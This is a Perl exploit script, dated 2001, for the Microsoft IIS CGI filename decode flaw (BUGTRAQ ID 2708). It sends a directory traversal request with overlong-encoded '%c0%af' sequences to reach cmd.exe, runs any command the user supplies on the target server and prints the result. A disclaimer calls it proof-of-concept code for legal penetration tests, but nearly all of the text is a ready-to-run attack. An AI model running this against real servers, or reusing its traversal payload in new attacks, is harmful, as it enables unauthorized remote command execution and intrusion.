#!/usr/bin/perl
#
# iisxpl.pl:
#
# Copyright (c) 2001 Stanislav Lechev [AngelFire]. All rights reserved.
#  <af@0xAF.org>
#
# License: WTFPL

use Socket;

if ($#ARGV < 0) {
print'
Microsoft IIS CGI Filename Decode Error Exploit
   by Stanislav Lechev [AngelFire] <af@0xAF.org>

BUGTRAQ ID: 2708 - Microsoft IIS CGI Filename Decode Error.
Works with IIS versions 3, 4 and 5!.

DISCLAIMER:
    This is proof of concept code. This means, this code
    may only be used on approved systems in order to test the
    availability and integrity of machines during a legal
    penetration test. In no way is the author of this exploit
    responsible for the use and result of this code.


';

        print "usage: $0 <host/ip> [command] [arg] [arg] [...]\n";
        print "\n";
        exit 0;
}


$URL="scripts/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+";
#$URL="scripts/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
#$URL="/scripts/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+";

$host=shift(@ARGV);
foreach $a(@ARGV) {
        $cmd.=" $a";
}
($cmd)=($cmd=~/^ (.*)$/);
$cmd="ver" if !$cmd;
print"Host\t: $host
Command\t: $cmd
";
$cmd1=$cmd;
$cmd=~s/(\W)/sprintf("%%%x", ord($1))/eg;

$GET="GET /$URL";

#print "OS Version: ";&parse_result(&connect_and_send("ver"));

print "Result ($cmd1):\n\n\n";
&parse_result(&connect_and_send("$cmd"));



sub parse_result {
        my(@rep) = @_;

        my($res,@r,$rr,$rrr);
        my $is = 0;

        ($res) = ($rep[0]=~/^HTTP\/1\.\d+ (\d+) \S+/i);

        foreach (@rep) {
                s/[\r|\n]//g;
                $is = 1 if $_=~/^Content-Type: /;
                next if ($is==0);
                push @r, $_ if (($_!~/^Content-Type: /i) and ($_!~/^Content-Length: /i));
        }
        if ($res == 200) {
                foreach (@r) {
                        print "$_\n";
                }
        } elsif ($res == 502) {
                foreach (@r) {
                        $rr.=$_."_-AF-_";
                }
                ($rrr) = ($rr=~/\<pre\>(.*)\<\/pre\>/i);
                $rrr=~s/_-AF-_/\n/g;
                print "$rrr\n";
        } else {
                print "Code: $res\n";
                foreach (@r) {
                        s/\<\S{1,6}\>/\n/g;
                        s/\n\n/\n/g;
                        print "$_\n";
                }
        }
}

sub connect_and_send {
        my ($pstr)=@_;

        socket( SH, PF_INET, SOCK_STREAM, getprotobyname('tcp'));

        $sin = sockaddr_in('80',inet_aton($host));

        if (connect(SH, $sin)) {
                my @in;
                select(SH);
                $|=1;
                print SH $GET.$pstr." HTTP/1.0\r\n\r\n";
                while (<SH>) {
                        push @in, $_;
                }
        select(STDOUT);
                close(SH);
                return @in;
        } else {
                print "Cannot connect to $host:80\n";
                exit(3);
        }
}
